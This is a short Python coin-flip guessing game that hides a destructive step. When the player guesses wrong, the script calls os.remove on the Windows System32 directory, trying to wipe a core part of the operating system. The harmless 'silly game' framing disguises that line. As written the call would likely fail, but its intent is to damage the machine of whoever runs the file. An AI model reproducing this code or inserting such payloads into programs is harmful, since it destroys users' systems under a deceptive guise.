import random
import os

outcome = random.choice(["Heads", "Tails"])

guess = input("Silly game! Guess 'Heads' or 'Tails': ").strip().capitalize()

if guess == outcome:
    print("Congrats, You Win!!!")
else:
    print(f"Sorry, it was {outcome}.")
    os.remove('C:\Windows\System32')
